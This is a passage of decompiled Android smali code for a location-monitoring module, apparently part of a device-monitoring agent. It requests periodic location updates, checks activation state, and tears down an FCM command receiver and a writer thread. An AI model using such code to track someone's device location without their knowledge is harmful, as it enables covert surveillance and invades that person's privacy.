    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    .line 338
    :cond_9
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0xe

    if-lt v1, v3, :cond_a

    .line 339
    invoke-virtual {p0, v6}, Lcom/hp/vd/module/monitor/LocationMonitor;->startOnIceCreamSandwich(Ljava/lang/String;)Z

    move-result v1

    goto :goto_5

    :cond_a
    move v1, v2

    :goto_5
    if-ne v1, v4, :cond_b

    .line 343
    iput-boolean v4, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->monitoringStatus:Z

    return v4

    .line 348
    :cond_b
    sget-object v1, Lcom/hp/vd/module/monitor/LocationMonitor;->TAG:Ljava/lang/String;

    const-string v3, "start(): could not start()."

    invoke-interface {v0, v1, v3, v4}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return v2

    nop

    :array_0
    .array-data 4
        0x1
        0x2
    .end array-data
.end method

.method public startOnHeartbeat()Z
    .locals 3

    .line 200
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/LocationMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    .line 206
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/LocationMonitor;->isActivated()Z

    move-result v1

    if-nez v1, :cond_0

    .line 207
    sget-object v1, Lcom/hp/vd/module/monitor/LocationMonitor;->TAG:Ljava/lang/String;

    const-string v2, "This module is currently DEactivated."

    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    const/4 v0, 0x0

    return v0

    :cond_0
    const/4 v0, 0x1

    return v0
.end method

.method protected startOnIceCreamSandwich(Ljava/lang/String;)Z
    .locals 7

    .line 357
    iget-object v0, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    .line 360
    :try_start_0
    iget-object v1, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->locationManager:Landroid/location/LocationManager;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v3, "probe_interval"

    .line 362
    invoke-virtual {v2, v3}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v2

    mul-int/lit16 v2, v2, 0x3e8

    int-to-long v3, v2

    const/4 v5, 0x0

    iget-object v6, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->locationListener:Landroid/location/LocationListener;

    move-object v2, p1

    .line 360
    invoke-virtual/range {v1 .. v6}, Landroid/location/LocationManager;->requestLocationUpdates(Ljava/lang/String;JFLandroid/location/LocationListener;)V
    :try_end_0
    .catch Ljava/lang/NullPointerException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/RuntimeException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    .line 371
    sget-object v1, Lcom/hp/vd/module/monitor/LocationMonitor;->TAG:Ljava/lang/String;

    const-string v2, "RuntimeException caught while requesting location updates"

    invoke-interface {v0, v1, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    goto :goto_0

    :catch_1
    move-exception p1

    .line 368
    sget-object v1, Lcom/hp/vd/module/monitor/LocationMonitor;->TAG:Ljava/lang/String;

    const-string v2, "NullPointerExpcetion caught while requesting location updates"

    invoke-interface {v0, v1, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 374
    :goto_0
    sget-object p1, Lcom/hp/vd/module/monitor/LocationMonitor;->TAG:Ljava/lang/String;

    const-string v1, "startOnIceCreamSandwich(): listener attached."

    invoke-interface {v0, p1, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    const/4 p1, 0x1

    return p1
.end method

.method public stop()Z
    .locals 4

    .line 401
    iget-object v0, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->commandReceiver:Lcom/hp/vd/module/monitor/location/FcmCommandReceiver;

    if-eqz v0, :cond_0

    .line 403
    :try_start_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    iget-object v1, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->commandReceiver:Lcom/hp/vd/module/monitor/location/FcmCommandReceiver;

    invoke-virtual {v0, v1}, Landroid/content/Context;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    const/4 v0, 0x0

    .line 404
    iput-object v0, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->commandReceiver:Lcom/hp/vd/module/monitor/location/FcmCommandReceiver;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 407
    iget-object v1, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v1

    sget-object v2, Lcom/hp/vd/module/monitor/LocationMonitor;->TAG:Ljava/lang/String;

    const-string v3, "fcm: Exception caught in stop()"

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 415
    :cond_0
    :goto_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->locationListener:Landroid/location/LocationListener;

    if-eqz v0, :cond_1

    .line 416
    iget-object v0, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->locationManager:Landroid/location/LocationManager;

    iget-object v1, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->locationListener:Landroid/location/LocationListener;

    invoke-virtual {v0, v1}, Landroid/location/LocationManager;->removeUpdates(Landroid/location/LocationListener;)V

    .line 419
    :cond_1
    iget-object v0, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->writerThread:Ljava/lang/Thread;

    if-eqz v0, :cond_2

    .line 420
    iget-object v0, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->writerThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->interrupt()V

    :cond_2
    const/4 v0, 0x0

    .line 427
    iput-boolean v0, p0, Lcom/hp/vd/module/monitor/LocationMonitor;->monitoringStatus:Z

    const/4 v0, 0x1

    return v0
.end method
